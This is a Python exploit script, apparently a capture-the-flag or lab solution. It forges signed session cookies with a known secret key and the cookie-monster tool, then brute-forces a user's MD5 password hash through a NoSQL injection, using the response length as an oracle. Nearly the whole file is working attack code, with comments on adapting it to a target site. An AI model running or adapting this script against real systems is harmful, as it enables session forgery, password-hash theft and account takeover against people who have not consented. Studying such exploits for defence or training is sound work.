#!/usr/bin/env python3

"""
author: otter ʕ •ᴥ•ʔ

This script uses the cookie-monster tool at https://github.com/DigitalInterruption/cookie-monster
to exploit a NoSqli vulnerability present in the cookie bruteforcing the password for a single user.
The script requires the key used to sign the cookie.
"""

import string
import subprocess
import json
import re
import requests

regex = r"cookie_name=([\w=\-_]+).*cookie_name\.sig=([\w=\-_]+)"


# write json cookie to file
def writeJson(j):
    with open("cookie.json", "w") as f:
        f.write(json.dumps(j))


# generate and sign the cookie with the secret key
def generateCookieAndSign(startsWith):
    j = {"user": {"username": {"contains": "username"},
                  "password": {"startsWith": startsWith}}}
    writeJson(j)

    # change the path to the cookie-monster.js file if needed
    out = subprocess.check_output(["cookie-monster/bin/cookie-monster.js", "-e", "-f", "cookie.json", "-k",
                                  "SECRET_KEY", "-n", "cookie_name"]).decode().replace("\n", " ")
    matches = re.findall(regex, out, re.MULTILINE)[0]
    return matches


# bruteforce the password with the `startsWith` query
# the used alphabet assumes the password is a MD5 hash format
passwd = ""
alphabet = "abcdef"+string.digits

for i in range(32):
    for s in alphabet:
        p = passwd + s
        (download_session, sig) = generateCookieAndSign(p)
        cookie = {"cookie_name": download_session,
                  "cookie_name.sig": sig}
        print(p, end='\r')
        r = requests.get('http://website.com/', cookies=cookie)
        # change the condition to know if the injection worked based on the website
        if len(r.text) != 2174:
            passwd = p
            break
print(passwd)
